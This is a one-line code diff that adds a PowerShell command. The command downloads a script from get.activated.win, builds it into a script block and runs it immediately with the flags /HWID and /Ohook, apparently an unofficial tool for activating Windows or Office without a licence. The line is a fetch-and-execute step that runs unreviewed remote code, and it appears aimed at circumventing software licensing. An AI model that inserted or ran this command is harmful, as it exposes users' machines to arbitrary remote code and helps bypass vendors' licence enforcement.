@@ -1,0 +1,1 @@
+& ([scriptblock]::Create((irm https://get.activated.win))) /HWID /Ohook
